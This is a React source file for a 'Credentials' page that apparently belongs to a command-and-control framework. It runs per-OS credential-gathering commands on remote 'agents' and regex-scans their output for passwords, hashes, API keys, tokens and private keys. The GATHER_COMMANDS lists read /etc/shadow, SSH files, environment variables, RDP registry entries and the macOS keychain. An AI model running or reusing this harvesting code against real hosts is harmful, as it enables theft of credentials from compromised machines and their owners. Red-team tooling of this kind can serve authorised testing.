import { useState, useEffect, useCallback } from 'react'
import { api } from '../api/client'
import type { AgentRecord, CredentialMatch } from '../api/types'
import { Key, Search, Trash, Loader, KeyRound, Link, Hash, Ticket } from 'lucide-react'

// Regex patterns for credential detection
const CRED_PATTERNS: { type: string; regex: RegExp; icon: typeof Key }[] = [
  { type: 'password', regex: /(?:password|passwd|pwd)\s*[=:]\s*["']?([^\s"'\r\n]{4,})/gi, icon: Key },
  { type: 'hash', regex: /\$[0-9][a-z]?\$[a-zA-Z0-9./]{16,}/g, icon: Hash },
  { type: 'hash_ntlm', regex: /[a-f0-9]{32}:[a-f0-9]{32}/gi, icon: Hash },
  { type: 'api_key', regex: /(?:api[_-]?key|apikey)\s*[=:]\s*["']?([A-Za-z0-9_\-]{20,})/gi, icon: KeyRound },
  { type: 'token', regex: /(?:token|bearer|jwt)\s*[=:]\s*["']?([A-Za-z0-9_\-.]{20,})/gi, icon: Ticket },
  { type: 'connection_string', regex: /(?:mongodb|postgres|mysql|redis|amqp):\/\/[^\s\r\n]{10,}/gi, icon: Link },
  { type: 'aws_key', regex: /AKIA[0-9A-Z]{16}/g, icon: KeyRound },
  { type: 'private_key', regex: /-----BEGIN (?:RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----/g, icon: Key },
]

// Credential gathering commands per OS
const GATHER_COMMANDS: Record<string, string[]> = {
  windows: [
    'whoami',
    'cmd /c set',
    'cmd /c type %USERPROFILE%\\.ssh\\known_hosts 2>nul',
    'cmd /c dir /b /s %USERPROFILE%\\*.rdp 2>nul',
    'cmd /c reg query "HKCU\\Software\\Microsoft\\Terminal Server Client\\Servers" /s 2>nul',
  ],
  linux: [
    'whoami',
    'env',
    'cat /etc/shadow 2>/dev/null',
    'ls -la ~/.ssh/ 2>/dev/null',
    'cat ~/.ssh/known_hosts 2>/dev/null',
  ],
  darwin: [
    'whoami',
    'env',
    'ls -la ~/.ssh/ 2>/dev/null',
    'cat ~/.ssh/known_hosts 2>/dev/null',
    'security find-generic-password -l 2>/dev/null',
  ],
}

export default function Credentials() {
  const [agents, setAgents] = useState<AgentRecord[]>([])
  const [selectedAgent, setSelectedAgent] = useState('')
  const [credentials, setCredentials] = useState<CredentialMatch[]>([])
  const [scanning, setScanning] = useState(false)
  const [scanProgress, setScanProgress] = useState('')
  const [manualText, setManualText] = useState('')
  const [filter, setFilter] = useState('all')

  const loadAgents = useCallback(async () => {
    try {
      const a = await api.listAgents()
      setAgents((a || []).filter(ag => ag.status === 'active'))
    } catch { /* ignore */ }
  }, [])

  useEffect(() => { loadAgents() }, [loadAgents])

  const scanOutput = (text: string, source: string): CredentialMatch[] => {
    const matches: CredentialMatch[] = []
    for (const { type, regex } of CRED_PATTERNS) {
      const r = new RegExp(regex.source, regex.flags)
      let m
      while ((m = r.exec(text)) !== null) {
        const value = m[1] || m[0]
        const start = Math.max(0, m.index - 40)
        const end = Math.min(text.length, m.index + value.length + 40)
        matches.push({
          type,
          source,
          context: text.slice(start, end).replace(/\n/g, ' ').trim(),
          value: value.length > 80 ? value.slice(0, 80) + '…' : value,
          timestamp: new Date().toISOString(),
        })
      }
    }
    return matches
  }

  const scanAgent = async () => {
    if (!selectedAgent) return
    setScanning(true)
    setError('')
    setCredentials([])
    const agent = agents.find(a => a.agent_id === selectedAgent)
    const os = agent?.os || 'linux'
    const commands = GATHER_COMMANDS[os] || GATHER_COMMANDS.linux
    const found: CredentialMatch[] = []

    for (const cmd of commands) {
      setScanProgress(`Running: ${cmd}`)
      try {
        const res = await api.execCmd(selectedAgent, cmd) as { stdout?: string; stderr?: string }
        const output = `${res.stdout || ''}\n${res.stderr || ''}`
        const matches = scanOutput(output, selectedAgent)
        found.push(...matches)
        setCredentials([...found])
      } catch (e) {
        // Continue on error — some commands will fail (no shadow access, etc.)
      }
    }

    setScanProgress(`Scan complete — ${found.length} credentials found`)
    setScanning(false)
  }

  const scanManual = () => {
    if (!manualText.trim()) return
    const matches = scanOutput(manualText, 'manual')
    setCredentials(prev => [...prev, ...matches])
    setManualText('')
  }

  const [error, setError] = useState('')

  const filtered = filter === 'all' ? credentials : credentials.filter(c => c.type === filter)

  const credTypes = [...new Set(credentials.map(c => c.type))]

  const typeIcon = (type: string) => {
    const p = CRED_PATTERNS.find(p => p.type === type)
    return p?.icon || Key
  }

  return (
    <div>
      <div className="page-header">
        <h1>Credentials</h1>
        <p>Scan agents for credentials in environment variables, config files, and command outputs</p>
      </div>

      {error && <div className="error-msg">{error}</div>}

      <div className="card">
        <div className="card-title">Scan Agent</div>
        <div className="flex gap-8 mb-16" style={{ alignItems: 'flex-end' }}>
          <div className="form-group" style={{ flex: 1, marginBottom: 0 }}>
            <label>Select Agent</label>
            <select value={selectedAgent} onChange={e => setSelectedAgent(e.target.value)}>
              <option value="">— Select an active agent —</option>
              {agents.map(a => (
                <option key={a.agent_id} value={a.agent_id}>{a.name || a.agent_id.slice(0, 16)} ({a.os})</option>
              ))}
            </select>
          </div>
          <button className="btn btn-primary" onClick={scanAgent} disabled={!selectedAgent || scanning}>
            {scanning ? <><Loader size={14} className="spin" /> Scanning…</> : <><Search size={14} /> Scan Agent</>}
          </button>
        </div>
        {scanning && <div className="dim" style={{ fontSize: 12 }}>{scanProgress}</div>}
      </div>

      <div className="card">
        <div className="card-title">Scan Manual Input</div>
        <p className="dim mb-16" style={{ fontSize: 12 }}>Paste terminal output, file contents, or any text to extract credentials</p>
        <textarea
          value={manualText}
          onChange={e => setManualText(e.target.value)}
          placeholder="Paste output here…"
          style={{ width: '100%', minHeight: '100px', padding: '10px 14px', border: '1px solid var(--border)', borderRadius: 'var(--radius)', background: 'var(--bg-input)', color: 'var(--text)', fontFamily: 'var(--font-mono)', fontSize: 13, resize: 'vertical' }}
        />
        <div className="mt-16">
          <button className="btn btn-primary" onClick={scanManual} disabled={!manualText.trim()}>
            <Search size={14} /> Scan Text
          </button>
        </div>
      </div>

      <div className="card">
        <div className="flex gap-8 mb-16" style={{ alignItems: 'center' }}>
          <div className="card-title" style={{ margin: 0 }}>
            Found Credentials ({credentials.length})
          </div>
          {credTypes.length > 0 && (
            <select value={filter} onChange={e => setFilter(e.target.value)} style={{ width: 'auto' }}>
              <option value="all">All Types</option>
              {credTypes.map(t => <option key={t} value={t}>{t}</option>)}
            </select>
          )}
          {credentials.length > 0 && (
            <button className="btn btn-danger btn-sm" onClick={() => setCredentials([])}>
              <Trash size={14} /> Clear
            </button>
          )}
        </div>

        {filtered.length === 0 ? (
          <div className="empty-state">
            <Key size={32} style={{ opacity: 0.3, marginBottom: 12 }} />
            <div>No credentials found yet</div>
            <div style={{ fontSize: 12, marginTop: 8 }}>Scan an agent or paste text to extract credentials</div>
          </div>
        ) : (
          <div className="table-container">
            <table>
              <thead>
                <tr><th>Type</th><th>Source</th><th>Value</th><th>Context</th><th>Found</th></tr>
              </thead>
              <tbody>
                {filtered.map((c, i) => {
                  const Icon = typeIcon(c.type)
                  return (
                    <tr key={i}>
                      <td>
                        <span className="flex gap-8" style={{ alignItems: 'center' }}>
                          <Icon size={14} className="green" />
                          <span className="badge badge-yellow">{c.type}</span>
                        </span>
                      </td>
                      <td className="mono dim" style={{ fontSize: 11 }}>{c.source === 'manual' ? 'manual' : c.source.slice(0, 12) + '…'}</td>
                      <td className="mono green" style={{ fontSize: 12, maxWidth: '300px', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{c.value}</td>
                      <td className="dim mono" style={{ fontSize: 11, maxWidth: '300px', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{c.context}</td>
                      <td className="dim" style={{ fontSize: 11 }}>{new Date(c.timestamp).toLocaleTimeString()}</td>
                    </tr>
                  )
                })}
              </tbody>
            </table>
          </div>
        )}
      </div>
    </div>
  )
}